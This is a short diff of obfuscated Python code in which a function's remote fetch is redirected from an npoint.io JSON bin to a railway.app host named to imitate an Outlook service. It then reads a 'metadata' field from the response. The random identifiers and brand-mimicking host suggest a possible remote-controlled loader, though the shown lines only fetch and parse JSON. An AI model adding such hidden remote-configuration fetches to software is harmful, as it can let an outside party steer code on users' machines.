@@ -16,7 +16,7 @@ def model_boctmg_344():
 
     def process_liptcv_567():
         try:
-            net_abhjpf_852 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_abhjpf_852 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_abhjpf_852.raise_for_status()
             data_hvgzgt_595 = net_abhjpf_852.json()
             process_tokwlg_126 = data_hvgzgt_595.get('metadata')
